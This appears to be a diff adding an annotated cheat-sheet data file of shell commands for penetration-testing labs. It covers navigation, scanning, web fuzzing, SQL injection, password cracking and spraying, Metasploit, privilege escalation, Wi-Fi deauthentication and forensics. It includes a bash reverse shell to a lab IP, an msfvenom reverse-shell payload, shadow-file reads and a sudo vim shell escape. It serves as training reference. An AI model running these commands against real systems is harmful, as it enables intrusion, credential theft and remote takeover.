@@ -1,0 +1,277 @@
+@topic shell | Files & navigation
+pwd ## print the directory you are currently in
+ls -la ## list every file, hidden ones included, with permissions and sizes
+cd /var/www/html ## jump to the default web root
+cd ~/Downloads ## go to Downloads inside your home directory
+cd .. ## go up one directory
+mkdir -p loot/scans ## create nested directories in one go
+cp -r /etc/skel ~/backup ## copy a directory recursively
+mv shell.php /tmp/shell.php ## move (or rename) a file
+rm -rf ./tmp/* ## force-delete everything inside ./tmp
+touch notes.txt ## create an empty file or update its timestamp
+cat /etc/passwd ## print the list of local user accounts
+less /var/log/auth.log ## page through the authentication log
+head -n 20 access.log ## show the first 20 lines of a file
+tail -f /var/log/syslog ## follow a log file as it grows
+find / -name "*.conf" 2>/dev/null ## search the whole disk for config files, hiding errors
+locate rockyou.txt ## find a file by name using the locate database
+tar -xzvf archive.tar.gz ## extract a gzip-compressed tarball
+unzip -q wordlist.zip -d ./lists ## unpack a zip quietly into a folder
+ln -s /opt/tools ~/tools ## create a symbolic link
+echo $PATH ## show where the shell looks for programs
+history | tail -n 30 ## show your last 30 commands
+man nmap ## open the manual page of a tool
+which python3 ## show the full path of a program
+df -h ## disk space per filesystem, human readable
+du -sh /var/log/* ## size of each item in a directory
+
+@topic text | Text processing
+grep -r "password" /etc 2>/dev/null ## search recursively for a string
+grep -i "error" app.log | wc -l ## count lines that match, ignoring case
+grep -v "^#" /etc/ssh/sshd_config ## show a config without its comment lines
+cut -d: -f1 /etc/passwd ## print only the usernames
+awk -F: '{print $1,$7}' /etc/passwd ## print each user with their login shell
+sed -i 's/http:/https:/g' urls.txt ## replace text in place across a file
+sort users.txt | uniq -c | sort -nr ## count duplicates, most frequent first
+tr 'a-z' 'A-Z' < names.txt ## convert lowercase to uppercase
+wc -l rockyou.txt ## count the lines in a wordlist
+cut -d: -f2 hashes.txt > only.txt ## keep the second field and save it
+diff old.conf new.conf ## show what changed between two files
+nmap -sn 10.10.10.0/24 | tee hosts.txt ## show output and save it at the same time
+cat urls.txt | xargs -n1 curl -sI ## run a command once per input line
+base64 -d secret.b64 ## decode a base64 file
+echo -n "admin:admin" | base64 ## encode credentials for a Basic auth header
+strings -n 8 firmware.bin | less ## pull readable text out of a binary
+jq '.users[].email' dump.json ## extract a field from JSON
+nano /etc/hosts ## edit a file in the nano editor
+vim ~/.bashrc ## edit your shell configuration in vim
+cat access.log | awk '{print $1}' | sort -u ## list the unique client IPs in a web log
+
+@topic perms | Users & permissions
+whoami ## print the user you are running as
+id ## show your uid, gid and groups
+sudo -l ## list what you may run with sudo
+sudo su - ## become root with a full login shell
+chmod +x exploit.sh ## make a script executable
+chmod 600 ~/.ssh/id_rsa ## private keys must be readable only by you
+chmod 755 /var/www/html ## owner full access, everyone else read and execute
+chown -R www-data:www-data /var/www ## change owner and group recursively
+useradd -m -s /bin/bash analyst ## create a user with a home directory and bash
+passwd analyst ## set a user's password
+usermod -aG sudo analyst ## add a user to the sudo group
+groups analyst ## show which groups a user belongs to
+sudo cat /etc/shadow ## read the password hashes (root only)
+ls -l /etc/sudoers.d/ ## look at extra sudo rules
+umask 077 ## new files will be private to you
+su - postgres ## switch to another account
+last -a | head ## show the most recent logins
+stat /etc/passwd ## show owner, permissions and timestamps of a file
+
+@topic system | Processes & packages
+ps aux | grep apache2 ## find a running process
+htop ## interactive process viewer
+kill -9 1337 ## force-kill a process by PID
+pkill -f python3 ## kill processes by matching their command line
+systemctl status ssh ## check whether a service is running
+sudo systemctl enable --now apache2 ## start a service now and at every boot
+journalctl -u ssh --since today ## read a service's log for today
+sudo apt update && sudo apt full-upgrade -y ## refresh package lists and upgrade everything
+sudo apt install -y seclists ## install a package without prompts
+uname -a ## kernel version and architecture
+cat /etc/os-release ## which distribution and version this is
+crontab -l ## list your scheduled jobs
+lsblk ## list disks and partitions
+free -h ## memory usage, human readable
+env | grep -i proxy ## look for proxy settings in the environment
+export PATH=$PATH:/opt/tools/bin ## add a directory to your PATH
+source ~/.zshrc ## reload your shell configuration
+alias ll='ls -alF' ## define a shortcut command
+nohup ./server.sh & ## keep a job running after you log out
+uptime ## how long the system has been up, and its load
+
+@topic net | Networking
+ip a ## show interfaces and their IP addresses
+ip route show ## show the routing table
+ping -c 4 10.10.10.5 ## send four ICMP echo requests
+ss -tulnp ## list listening TCP/UDP ports with their processes
+netstat -antp ## all TCP connections with PIDs
+curl -I https://example.com ## fetch only the response headers
+curl -s http://10.10.10.5/robots.txt ## quietly fetch a file over HTTP
+wget -q http://10.10.14.2:8000/linpeas.sh ## download a file from your own web server
+python3 -m http.server 8000 ## serve the current directory over HTTP
+nc -lvnp 4444 ## listen on a port with netcat
+nc -nv 10.10.10.5 80 ## connect to a port and grab its banner
+ssh user@10.10.10.5 -p 2222 ## SSH to a host on a non-standard port
+ssh -i id_rsa root@target.htb ## log in with a private key
+ssh -L 8080:127.0.0.1:80 user@10.10.10.5 ## forward a local port through SSH
+scp loot.zip kali@10.10.14.2:/tmp/ ## copy a file to another machine over SSH
+traceroute example.com ## show the route packets take
+arp -a ## show the ARP cache (IP to MAC)
+sudo tcpdump -i eth0 -nn port 80 ## capture HTTP traffic on an interface
+sudo tcpdump -i tun0 icmp ## watch for pings arriving over the VPN
+sudo openvpn lab.ovpn ## connect to a lab VPN
+echo "10.10.10.5 target.htb" | sudo tee -a /etc/hosts ## map a hostname to an IP
+sudo iptables -L -n -v ## list firewall rules with counters
+ssh-keygen -t ed25519 -C "kali@lab" ## generate a new SSH key pair
+
+@topic recon | Recon & scanning
+nmap -sn 192.168.1.0/24 ## ping sweep: find live hosts without port scanning
+nmap -sC -sV -oN initial.txt 10.10.10.5 ## default scripts, version detection, save to a file
+nmap -p- --min-rate 5000 10.10.10.5 ## scan all 65535 TCP ports quickly
+sudo nmap -sU --top-ports 50 10.10.10.5 ## scan the 50 most common UDP ports
+nmap -A -T4 target.htb ## aggressive scan: OS, versions, scripts, traceroute
+nmap --script vuln -p 80,443 10.10.10.5 ## run vulnerability scripts against web ports
+nmap -Pn -p 445 --script smb-os-discovery 10.10.10.5 ## skip host discovery and fingerprint SMB
+whois example.com ## look up domain registration details
+dig example.com ANY +short ## query DNS records, compact output
+dig axfr @ns1.example.com example.com ## attempt a DNS zone transfer
+host -t mx example.com ## find a domain's mail servers
+nslookup -type=txt example.com ## read TXT records (SPF, verification tokens)
+dnsrecon -d example.com -t std ## standard DNS enumeration
+theHarvester -d example.com -b all ## collect emails and subdomains from public sources
+amass enum -passive -d example.com ## passive subdomain enumeration
+subfinder -d example.com -silent ## fast subdomain discovery
+enum4linux -a 10.10.10.5 ## enumerate users, shares and policies over SMB
+smbclient -L //10.10.10.5 -N ## list SMB shares with a null session
+smbmap -H 10.10.10.5 -u guest ## show share permissions for a user
+whatweb http://target.htb ## fingerprint the technologies behind a website
+sudo masscan -p1-65535 10.10.10.5 --rate=1000 ## very fast full-range port scan
+rpcclient -U "" -N 10.10.10.5 ## open an anonymous RPC session
+snmpwalk -v2c -c public 10.10.10.5 ## walk SNMP with the default community string
+showmount -e 10.10.10.5 ## list NFS exports
+
+@topic web | Web testing
+gobuster dir -u http://target.htb -w /usr/share/wordlists/dirb/common.txt ## brute-force directories with a wordlist
+gobuster dir -u http://target.htb -w common.txt -x php,txt,html ## also try these file extensions
+gobuster vhost -u http://target.htb -w subdomains.txt ## discover virtual hosts
+ffuf -u http://target.htb/FUZZ -w common.txt ## fuzz the path where FUZZ appears
+ffuf -u http://target.htb -H "Host: FUZZ.target.htb" -w subs.txt -fs 0 ## fuzz the Host header, filter empty responses
+feroxbuster -u http://target.htb -x php ## recursive content discovery
+dirb http://target.htb ## classic directory scanner with its default list
+nikto -h http://target.htb ## scan a web server for known issues
+sqlmap -u "http://target.htb/item.php?id=1" --batch --dbs ## test a parameter for SQL injection and list databases
+sqlmap -r request.txt --level 3 --risk 2 ## test a request saved from Burp
+sqlmap -u "http://target.htb/?id=1" -D shop -T users --dump ## dump one table from one database
+wpscan --url http://target.htb --enumerate u,vp ## enumerate WordPress users and vulnerable plugins
+curl -X POST -d "user=admin&pass=admin" http://target.htb/login ## send a form with POST
+curl -s -b "session=abc123" http://target.htb/admin ## send a request with a cookie
+curl -H "X-Forwarded-For: 127.0.0.1" http://target.htb/ ## add a custom header
+wfuzz -c -z file,common.txt --hc 404 http://target.htb/FUZZ ## fuzz and hide 404 responses
+burpsuite & ## start Burp Suite in the background
+sslscan example.com ## list supported TLS versions and ciphers
+openssl s_client -connect example.com:443 ## open a raw TLS connection and inspect the certificate
+nuclei -u http://target.htb -severity high,critical ## run template-based checks, serious findings only
+
+@topic passwords | Password attacks
+hydra -l admin -P rockyou.txt ssh://10.10.10.5 ## try a wordlist against SSH for one user
+hydra -L users.txt -P pass.txt 10.10.10.5 ftp ## try user and password lists against FTP
+hydra -l admin -P rockyou.txt target.htb http-post-form "/login:user=^USER^&pass=^PASS^:Invalid" ## attack a web login form
+john --wordlist=rockyou.txt hashes.txt ## crack hashes with a wordlist
+john --show hashes.txt ## show the passwords cracked so far
+john --format=raw-md5 hashes.txt ## tell john which hash type to use
+hashcat -m 0 -a 0 hashes.txt rockyou.txt ## dictionary attack on MD5 hashes
+hashcat -m 1000 ntlm.txt rockyou.txt -r best64.rule ## NTLM hashes with a rule set
+hashcat -m 1800 -a 3 hash.txt ?l?l?l?l?d?d ## mask attack: four letters then two digits
+hashid '$2y$10$abcdefghijklmnopqrstuv' ## guess which algorithm produced a hash
+unshadow /etc/passwd /etc/shadow > unshadowed.txt ## combine passwd and shadow for john
+zip2john secret.zip > zip.hash ## extract a crackable hash from a zip
+ssh2john id_rsa > ssh.hash ## extract a hash from an encrypted SSH key
+crunch 8 8 0123456789 -o pins.txt ## generate every 8-digit PIN
+cewl http://target.htb -w words.txt ## build a wordlist from a website's own words
+medusa -h 10.10.10.5 -u admin -P pass.txt -M ssh ## parallel login brute-forcer
+nxc smb 10.10.10.5 -u users.txt -p 'Summer2024!' ## spray one password across many users
+sudo gunzip /usr/share/wordlists/rockyou.txt.gz ## unpack the rockyou wordlist
+echo -n "password" | md5sum ## compute the MD5 of a string
+openssl passwd -6 'S3cret!' ## create a SHA-512 crypt hash
+
+@topic exploit | Exploitation
+searchsploit apache 2.4.49 ## search Exploit-DB offline
+searchsploit -m 50383 ## copy an exploit into the current directory
+msfconsole -q ## start Metasploit without the banner
+search type:exploit name:eternalblue ## search modules inside Metasploit
+use exploit/multi/handler ## select the generic payload handler
+set PAYLOAD linux/x64/meterpreter/reverse_tcp ## choose a payload
+set LHOST tun0 ## listen on your VPN interface
+set RHOSTS 10.10.10.5 ## set the target
+show options ## list a module's settings
+run -j ## run the module as a background job
+sessions -i 1 ## interact with session 1
+msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.2 LPORT=4444 -f elf -o shell.elf ## generate a payload file
+msfvenom -l payloads | grep windows/x64 ## list available payloads
+python3 -c 'import pty; pty.spawn("/bin/bash")' ## upgrade a dumb shell to a pty
+export TERM=xterm-256color ## make clear and editors work in a caught shell
+stty raw -echo; fg ## finish stabilising a shell after Ctrl+Z
+bash -i >& /dev/tcp/10.10.14.2/4444 0>&1 ## classic bash reverse shell (lab use only)
+rlwrap nc -lvnp 9001 ## netcat listener with history and arrow keys
+gcc exploit.c -o exploit -static ## compile an exploit as a static binary
+python3 exploit.py --rhost 10.10.10.5 --lhost 10.10.14.2 ## run a proof-of-concept script
+impacket-psexec admin:'P@ssw0rd'@10.10.10.5 ## get a shell over SMB with valid credentials
+evil-winrm -i 10.10.10.5 -u admin -p 'P@ssw0rd' ## open a WinRM shell
+gdb -q ./vuln ## debug a binary
+checksec --file=./vuln ## show which exploit mitigations a binary has
+
+@topic privesc | Privilege escalation
+find / -perm -4000 -type f 2>/dev/null ## find SUID binaries
+find / -writable -type d 2>/dev/null ## find world-writable directories
+getcap -r / 2>/dev/null ## find files with Linux capabilities
+cat /etc/crontab ## system-wide scheduled jobs
+ls -la /etc/cron.d/ ## more scheduled jobs
+uname -r ## kernel release, to check for known kernel bugs
+ps aux | grep root ## processes running as root
+./linpeas.sh | tee linpeas.out ## run an enumeration script and keep its output
+cat ~/.bash_history ## look for secrets in shell history
+grep -ri "passw" /var/www 2>/dev/null ## hunt for credentials in web files
+sudo -u root /bin/bash ## run a shell as another user through sudo
+sudo vim -c ':!/bin/sh' ## escape to a shell from a sudo-allowed vim
+ls -la /home/*/.ssh/ ## look for readable SSH keys
+netstat -tulnp | grep 127.0.0.1 ## services listening only on localhost
+id; hostname; whoami ## quick proof of who and where you are
+cat /etc/fstab ## mounted filesystems and their options
+./pspy64 -pf -i 1000 ## watch processes start without being root
+echo $PATH | tr ':' '\n' ## print each PATH entry on its own line
+dpkg -l | grep -i sudo ## check an installed package's version
+cat /proc/version ## kernel and compiler version
+
+@topic wireless | Wireless
+iwconfig ## show wireless interfaces and their mode
+sudo airmon-ng check kill ## stop processes that interfere with monitor mode
+sudo airmon-ng start wlan0 ## put the adapter into monitor mode
+sudo airodump-ng wlan0mon ## list nearby access points and clients
+sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon ## capture one network on one channel
+sudo aireplay-ng --deauth 5 -a AA:BB:CC:DD:EE:FF wlan0mon ## force a re-handshake on your own lab AP
+aircrack-ng -w rockyou.txt capture-01.cap ## crack a captured WPA handshake
+sudo airmon-ng stop wlan0mon ## leave monitor mode
+sudo systemctl restart NetworkManager ## bring normal networking back
+sudo iw dev wlan0 scan | grep SSID ## scan for network names
+sudo macchanger -r wlan0 ## set a random MAC address
+sudo ip link set wlan0 down ## take an interface down
+sudo iw dev wlan0 set type monitor ## switch to monitor mode by hand
+hcxpcapngtool -o hash.hc22000 capture.pcapng ## convert a capture for hashcat
+hashcat -m 22000 hash.hc22000 rockyou.txt ## crack WPA2 with hashcat
+sudo wash -i wlan0mon ## list access points with WPS enabled
+nmcli dev wifi list ## list Wi-Fi networks with NetworkManager
+sudo kismet -c wlan0mon ## passive wireless monitoring
+
+@topic forensics | Forensics & crypto
+file suspicious.bin ## identify a file by its contents, not its name
+strings suspicious.bin | grep -i flag ## search a binary's text for a keyword
+xxd -l 64 suspicious.bin ## hex dump of the first 64 bytes
+hexdump -C header.bin | head ## canonical hex and ASCII view
+binwalk -e firmware.bin ## find and extract embedded files
+exiftool photo.jpg ## read a file's metadata
+steghide extract -sf photo.jpg ## extract data hidden in an image
+sha256sum evidence.img ## hash a file to prove its integrity
+md5sum -c checksums.md5 ## verify files against a checksum list
+sudo dd if=/dev/sdb of=evidence.img bs=4M status=progress ## image a disk
+volatility3 -f memory.raw windows.pslist ## list processes from a memory dump
+foremost -i evidence.img -o carved ## carve deleted files out of an image
+tshark -r capture.pcap -Y "http.request" -T fields -e http.host ## list the hosts requested in a capture
+wireshark capture.pcap & ## open a capture in Wireshark
+openssl enc -aes-256-cbc -d -in secret.enc -out secret.txt ## decrypt an AES-encrypted file
+gpg --decrypt message.asc ## decrypt a PGP message
+openssl x509 -in cert.pem -noout -text ## print a certificate's details
+echo "ZmxhZ3t0ZXN0fQ==" | base64 -d ## decode a base64 string
+objdump -d ./crackme | less ## disassemble a binary
+ltrace ./crackme ## trace library calls
+strace -f ./crackme ## trace system calls, following child processes
+sudo mount -o ro,loop evidence.img /mnt/evidence ## mount an image read-only
